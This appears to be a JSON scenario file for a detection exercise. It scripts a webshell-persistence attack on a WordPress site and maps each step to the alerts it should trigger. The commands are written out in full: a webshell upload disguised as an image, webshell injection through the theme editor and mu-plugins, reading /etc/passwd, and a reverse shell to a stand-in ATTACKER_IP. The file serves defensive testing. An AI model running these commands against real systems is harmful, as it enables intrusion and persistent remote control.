@@ -1,0 +1,57 @@
+{
+  "scenario_id": "S4",
+  "name": "webshell_persistence",
+  "description": "웹셸 업로드 + 명령 실행 (지속 접근 확보)",
+  "category": "persistence",
+  "severity": "critical",
+  "mitre_tactics": ["TA0003-Persistence", "TA0002-Execution", "TA0005-Defense Evasion"],
+  "mitre_techniques": ["T1505.003-Server Software Component: Web Shell", "T1059.004-Command and Scripting Interpreter: Unix Shell"],
+  "prerequisites": ["S2 계정 탈취 (editor 이상)", "WordPress 미디어 업로드 가능"],
+  "actor": "공격자 (탈취 계정 사용)",
+  "steps": [
+    {
+      "step": 1,
+      "action": "PHP 웹셸을 이미지로 위장하여 업로드",
+      "command": "curl -b stolen.txt -F 'file=@shell.php.jpg;type=image/jpeg' https://ALB_DNS/wp-admin/async-upload.php",
+      "expected": "업로드 성공 또는 차단 (PHP 확장자 필터)"
+    },
+    {
+      "step": 2,
+      "action": "테마 편집기로 웹셸 삽입",
+      "command": "curl -b stolen.txt -d 'newcontent=<?php system($_GET[\"cmd\"]); ?>&file=footer.php&theme=twentytwentyfour' https://ALB_DNS/wp-admin/theme-editor.php",
+      "expected": "DISALLOW_FILE_EDIT로 차단 → 우회 시도"
+    },
+    {
+      "step": 3,
+      "action": "mu-plugins 디렉토리에 웹셸 생성 (SSM 통한 직접 배치 — 시뮬레이션)",
+      "command": "echo '<?php if(isset($_GET[\"ea\"])){system($_GET[\"ea\"]);} ?>' > /var/www/html/wp-content/mu-plugins/health-check.php",
+      "expected": "파일 생성 → auditd/Elastic Defend 탐지"
+    },
+    {
+      "step": 4,
+      "action": "웹셸로 명령 실행",
+      "command": "curl 'https://ALB_DNS/?ea=id;whoami;cat+/etc/passwd'",
+      "expected": "Suricata SID 9000002/9000003, auditd execve"
+    },
+    {
+      "step": 5,
+      "action": "역방향 셸 시도 (아웃바운드 차단 확인)",
+      "command": "curl 'https://ALB_DNS/?ea=bash+-i+>%26+/dev/tcp/ATTACKER_IP/4444+0>%261'",
+      "expected": "SG 아웃바운드 차단, Suricata SID 9000002"
+    }
+  ],
+  "expected_evidence": {
+    "waf": ["AWSManagedRulesKnownBadInputsRuleSet (webshell pattern)"],
+    "suricata": ["SID 9000002 (cmd injection)", "SID 9000003 (webshell access)"],
+    "nginx": ["비정상 쿼리 파라미터 (cmd=, ea=)"],
+    "apache": ["200 응답 + 비정상 응답 크기"],
+    "wordpress_audit": ["media_uploaded (의심 파일)"],
+    "elastic_defend": ["file_create (mu-plugins/*.php)", "process_exec (www-data → system commands)"],
+    "auditd": ["execve (www-data: id, whoami, cat)", "file_create 감지"],
+    "flow_logs": ["아웃바운드 REJECT (역방향 셸 시도)"],
+    "cloudtrail": [],
+    "rds": []
+  },
+  "detection_rules": ["suricata-9000002", "suricata-9000003", "waf-known-bad", "elastic-webshell-file-create", "elastic-suspicious-process-www-data", "auditd-web-user-command-exec"],
+  "success_criteria": "웹셸 생성·실행 탐지 → critical alert → 자동 증거 수집 + 격리 판단"
+}
